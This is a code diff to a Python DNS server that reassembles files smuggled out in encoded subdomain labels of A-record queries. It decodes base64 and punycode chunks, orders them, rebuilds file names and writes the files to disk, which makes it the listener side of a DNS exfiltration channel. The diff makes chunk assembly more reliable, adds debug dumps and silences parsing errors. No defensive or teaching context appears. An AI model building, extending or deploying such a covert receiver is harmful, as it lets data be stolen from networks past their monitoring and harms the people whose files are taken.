@@ -1,3 +1,4 @@
+import json
 import os
 import pprint
 import socket
@@ -27,11 +28,13 @@ def install_and_import(package, package_and_version, from_imports=None):
 
 
 install_and_import("base64", "cryptography==39.0.1")
-install_and_import("base64", "chardet==5.2.0")
+install_and_import("chardet", "chardet==5.2.0")
 install_and_import("tldextract", "tldextract==5.1.1")
 install_and_import("dns.resolver", "dnspython==2.0.0")
 install_and_import("yagmail", "yagmail==0.15.293")
-install_and_import("yagmail", "httpcore==0.13.3")
+install_and_import("httpcore", "httpcore==0.13.3")
+install_and_import("requests", "requests==2.28.1")
+
 
 import base64
 import dns.resolver
@@ -92,16 +95,19 @@ def decode_base64_to_file(content, output_file_path):
     print(f"{output_file_path} has been written.")
 
 def decode_upper_case(text):
-    try:
+    if "-" in text:
         text = "xn--" + text
-        text = text.encode("utf-8")
-        text = text.decode('idna')
-        text = apply_demapper(text, uppercase_demapping)
-    except:
-        pass
 
-    return text
+    text_decode = text.encode("utf-8")
+    text_decode = text_decode.decode('idna')
 
+    if text == text_decode:
+        text_decode = ("xn--" + text).encode("utf-8")
+        text_decode = text_decode.decode('idna')
+
+    text_decode = apply_demapper(text_decode, uppercase_demapping)
+
+    return text_decode
 
 def apply_demapper(mapped_string, demapping):
     demapped_string = ""
@@ -113,7 +119,7 @@ def apply_demapper(mapped_string, demapping):
     return demapped_string
 
 
-def combine_results(query, file_chunks, out_dir):
+def combine_results(query, file_chunks, out_dir, debug):
     query = query.lower()
     query = query.strip(".")
 
@@ -126,14 +132,31 @@ def combine_results(query, file_chunks, out_dir):
         file_identifier = parsed_subdomain[0]
         pl2 = parsed_subdomain[2].partition("-")
         order = int(pl2[0])
+        data_index = order // 10 - 1
         payload = pl2[2]
+        payload_query = payload
         payload = decode_upper_case(payload)
 
         if file_identifier in file_chunks and file_chunks[file_identifier]["file_name"]:
 
             if payload == "ZmluaXNo":  # base64 for finish
-                content = "".join(file_chunks[file_identifier]["data"])
+                try:
+                    content = "".join(file_chunks[file_identifier]["data"][:data_index])
+                    if debug == 1:
+                        f = open(f"{file_identifier}_receivedfile.txt", "w")
+                        f.write(content)
+                        f.close()
+                except:
+                    pprint.pprint(file_chunks[file_identifier])
+                    print("combine error")
+                    content = ""
+
                 decoded_content = content.encode("utf-8")
+
+                if debug == 1:
+                    f = open(f"{file_identifier}_chunks.json", "w")
+                    f.write(json.dumps(file_chunks[file_identifier],indent=2))
+                    f.close()
 
                 if 'file_name' in file_chunks[file_identifier] and file_chunks[file_identifier]["file_name"]:
                     out_file = f"{out_dir}/{file_identifier}/{file_chunks[file_identifier]['file_name']}"
@@ -142,41 +165,46 @@ def combine_results(query, file_chunks, out_dir):
                     del file_chunks[file_identifier]
 
             else:
-                if len(file_chunks[file_identifier]["data"]) > 0:
-                    data_index = order // 10 - 1
+                #if len(file_chunks[file_identifier]["data"]) > 0:
+                file_chunks[file_identifier]["data"][data_index] = payload
+                file_chunks[file_identifier]["payload"][data_index] = payload_query
+
+                """if payload not in file_chunks[file_identifier]["data"]:
                     file_chunks[file_identifier]["data"].insert(data_index, payload)
+                    file_chunks[file_identifier]["payload"].insert(order, payload_query)
+                else:
+                    if file_chunks[file_identifier]["data"].index(payload) != data_index:
+                        file_chunks[file_identifier]["data"].insert(data_index, payload)
+                        file_chunks[file_identifier]["payload"].insert(order, payload_query)"""
 
         else:
-            if order == 0:
-                #payload = decode64(payload)
-                #payload = payload.rpartition("-")
-                #file_name = payload[0]
-                #part_size = int(payload[2])
+            if order == 0:  # init for file identifier
+                file_chunks[file_identifier] = {"file_name": None, "data": [], "file_name_chunks": [payload], "payload": []}
 
-                file_chunks[file_identifier] = {"file_name": None, "data": [], "file_name_chunks": [payload]}
+            elif order < 10:  # for multiple filename chunk
+                if payload not in file_chunks[file_identifier]["file_name_chunks"]:
+                    file_chunks[file_identifier]["file_name_chunks"].insert(order, payload)
 
-            elif order < 10:
-                #payload = decode64(payload)
-                #payload = payload.rpartition("-")
-                #file_name = payload[0]
-                #part_size = int(payload[2])
-                file_chunks[file_identifier]["file_name_chunks"].insert(order, payload)
-
-            elif order == 10:
+            elif order == 10:  # for set file name and set first data chunk
                 file_name_payload = "".join(file_chunks[file_identifier]["file_name_chunks"])
                 file_payload = decode64(file_name_payload)
                 file_payload = file_payload.rpartition("-")
                 file_name = file_payload[0]
                 part_size = int(file_payload[2])
+                print(f"{file_identifier} - file chunk: {file_name_payload} - file_name: {file_name}                                              ")
+
+                file_chunks[file_identifier]["data"] = [None]*part_size
+                file_chunks[file_identifier]["payload"] = [None]*part_size
 
                 file_chunks[file_identifier]["file_name"] = file_name
-                data_index = order//10-1
-                file_chunks[file_identifier]["data"].insert(data_index, payload)
+
+                file_chunks[file_identifier]["data"][data_index] = payload
+                file_chunks[file_identifier]["payload"][data_index] = payload_query
 
     return file_chunks
 
 
-def dns_response(query, ttl, response_ip, file_chunks, out_dir):
+def dns_response(query, ttl, response_ip, file_chunks, out_dir, debug):
     response = dns.message.make_response(query)
 
     # Check the query type
@@ -186,14 +214,12 @@ def dns_response(query, ttl, response_ip, file_chunks, out_dir):
     if qtype == dns.rdatatype.A:
         # Assuming the query is an A record query
         answer = dns.rrset.from_text(qname, ttl, dns.rdataclass.IN, dns.rdatatype.A, response_ip)
-        print(answer)
+        print(f"{answer}                                         ", end="\r", flush=True)
         response.answer.append(answer)
         response.set_rcode(dns.rcode.NOERROR)
 
-        try:
-            file_chunks = combine_results(str(qname), file_chunks, out_dir)
-        except ValueError as v:
-            pass
+        file_chunks = combine_results(str(qname), file_chunks, out_dir, debug)
+
     else:
         # If the query type is not A, respond with an empty answer section
         response.set_rcode(dns.rcode.NXDOMAIN)
@@ -218,11 +244,23 @@ def dns_server(host, port, ttl, response_ip, out_dir, debug):
                 try:
                     data, client_address = udp_socket.recvfrom(4096)
                     query = dns.message.from_wire(data)
-                    response, file_chunks = dns_response(query, ttl, response_ip, file_chunks, out_dir)
+                    response, file_chunks = dns_response(query, ttl, response_ip, file_chunks, out_dir, debug)
                     udp_socket.sendto(response.to_wire(), client_address)
+
+                except ValueError as v:
+                    pass
 
                 except KeyboardInterrupt as k:
                     exit(0)
+
+                except dns.name.BadLabelType as b:
+                    pass
+
+                except dns.exception.FormError as f:
+                    pass
+
+                except KeyError as k2:
+                    pass
 
                 except Exception as e:
                     if debug == 1:
